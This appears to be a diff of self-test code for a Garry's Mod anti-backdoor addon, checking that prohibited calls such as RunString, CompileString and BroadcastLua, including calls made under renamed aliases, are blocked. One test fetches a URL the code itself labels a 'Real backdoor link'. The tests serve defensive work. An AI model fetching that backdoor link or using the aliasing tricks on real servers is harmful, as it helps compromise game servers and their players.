@@ -23,7 +23,8 @@ function BS:Debug_RunTests(args)
         { "RunString", "Run a prohibited code combination" },
         { "RunString2", "Run a prohibited code combination with fake function names" },
         { "RunStringEx", "Run a prohibited code combination" },
-        { "tostring", "Try to check if a detoured function is valid" },
+        { "stack", "Run functions in a forbidden call stack" },
+        --{ "tostring", "Try to check if a detoured function is valid" },
     }
 
     tests.textAux = {}
@@ -78,6 +79,8 @@ function BS:Debug_RunTests(args)
         print()
     end
 
+    --[[
+    -- tostring detour is unstable
     function tests.tostring()
         MsgC(self.colors.header, "\n-----> tostring: " .. tests.textAux["tostring"] .. "\n")
         print()
@@ -88,6 +91,7 @@ function BS:Debug_RunTests(args)
         end
         print()
     end
+    --]]
 
     function tests.aux.debuggetfenv()
         MsgC(self.colors.header, "\n-----> debug.getfenv: " .. tests.textAux["debug.getfenv"] .. "\n")
@@ -105,10 +109,10 @@ function BS:Debug_RunTests(args)
 
     function tests.aux.httpFetch()
         MsgC(self.colors.header, "\n-----> http.Fetch: " .. tests.textAux["http.Fetch"] .. "\n")
-        self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
+        self.__G.http.Fetch("https://kvac.cz/f.php?key=sOn5ncyVYtRjxTR7vpKm", function (arg) -- Real backdoor link
             MsgC(self.colors.message, "\nProhibited code is running inside http.Fetch!\n")
         end)
-        MsgC(self.colors.message, "\n (Waiting) http.Fetch test result pending... Pass = block execution; Fail = run and print message.\n\n")
+        MsgC(self.colors.message, "\n (Waiting) http.Fetch test result pending... Pass = block execution; Fail = run script and print message.\n\n")
     end
     tests["http.Fetch"] = tests.aux.httpFetch
 
@@ -123,12 +127,12 @@ function BS:Debug_RunTests(args)
         self.__G.CompStrBypass = self.__G.CompileString
         self.__G.RunString([[ print("\n1") local two = CompStrBypass("print(2)") if isfunction(two) then two() end print("3")]]);
         self.__G.CompStrBypass = nil
-        MsgC(self.colors.message, "\n (Result) Pass = 1 and 3 are visible but 2 is blocked; Fail = 1, 2 and 3 are visible.\n\n")
+        MsgC(self.colors.message, "\n (Result) Pass = 1 and 3 are printed and 2 missing; Fail = 1, 2 and 3 are printed.\n\n")
     end
 
     function tests.RunStringEx()
         MsgC(self.colors.header, "\n-----> RunStringEx: " .. tests.textAux["RunStringEx"] .. "\n")
-        self.__G.RunStringEx([[RunString(print("Prohibited code is running!"))]]);
+        self.__G.RunStringEx([[BroadcastLua(print("Prohibited code is running!"))]]);
         MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
     end
 
@@ -160,9 +164,8 @@ function BS:Debug_RunTests(args)
 
     function tests.CompileFile()
         MsgC(self.colors.header, "\n-----> CompileFile: " .. tests.textAux["CompileFile"] .. "\n")
-        local compFile = self.__G.CompileFile("bs/server/libs/debug.lua")
-        print()
-        if not compFile then
+        local compFile = self.__G.CompileFile("bs/server/libs/liveprotection/debug.lua")
+        if not compFile() then
             MsgC(self.colors.message, " (Pass) A file full of prohibited code combinations wasn't compiled.\n")
         else
             MsgC(self.colors.message, " (Fail) A file full of prohibited code combinations was compiled!\n")
@@ -172,11 +175,12 @@ function BS:Debug_RunTests(args)
 
     function tests.CompileString()
         MsgC(self.colors.header, "\n-----> CompileString: " .. tests.textAux["CompileString"] .. "\n")
-        local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")
+        local compStr = self.__G.CompileString("RunString(\"MsgN('Fake malicious code successfully executed.') print()\")", "TestCode")
         print()
         if compStr == "" then
             MsgC(self.colors.message, " (Pass) A string with prohibited code combinations wasn't compiled.\n")
         else
+            compStr()
             MsgC(self.colors.message, " (Fail) A string with prohibited code combinations was compiled!\n")
         end
         print()
@@ -184,16 +188,25 @@ function BS:Debug_RunTests(args)
 
     function tests.PersistentTrace()
         MsgC(self.colors.header, "\n-----> PersistentTrace: " .. tests.textAux["PersistentTrace"] .. "\n")
-        self.__G.CompStr = self.__G.CompileString
         self.__G.code = [[ return "2" ]]
         self.__G.timer.Simple(0, function()
             self.__G.timer.Simple(0, function()
                 self.__G.RunString([[
-                    CompStr(code)
+                    BroadcastLua(code)
                 ]])
             end)
         end)
         MsgC(self.colors.message, "\n (Waiting) Persistent trace result pending... Pass = Trace with one \"(+) BS - Persistent Trace\"; Fail = Any other trace.\n\n")
+    end
+
+    function tests.stack()
+        MsgC(self.colors.header, "\n-----> stack: " .. tests.textAux["stack"] .. "\n")
+        self.__G.BdctLua = self.__G.BroadcastLua
+        self.__G.code = [[ print ("A blocked function has been executed.") ]]
+        self.__G.RunString([[
+            BdctLua(code)
+        ]])
+        MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
     end
 
     function tests.all(printDelayedMsg, functionsWithWaiting)
